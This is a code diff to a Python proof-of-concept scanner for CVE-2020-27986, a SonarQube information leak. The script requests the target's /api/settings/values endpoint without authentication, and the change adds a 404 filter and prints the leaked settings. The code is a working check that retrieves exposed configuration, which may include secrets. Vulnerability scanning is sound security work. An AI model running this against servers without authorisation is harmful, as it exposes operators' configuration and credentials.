@@ -4,6 +4,7 @@ CVE-2020-27986(SonarQube敏感信息泄露)
 
 import requests
 
+import main
 from main import hprint, print_blue
 
 
@@ -15,7 +16,9 @@ def SonarQube_data_leak(url, timeout=6):
     try:
         re = requests.get(url + '/api/settings/values', timeout=timeout)
         if 'setting' in re.text or 'key' in re.text:
-            return "成功"
+            if not 'Error 404 Not Found' in re.text:
+                main.print_red(re.text)
+                return "成功"
         else:
             return '失败'
     except ConnectionError as e:
@@ -24,4 +27,3 @@ def SonarQube_data_leak(url, timeout=6):
         return '连接超时'
     except Exception as e:
         return '未找到'
-
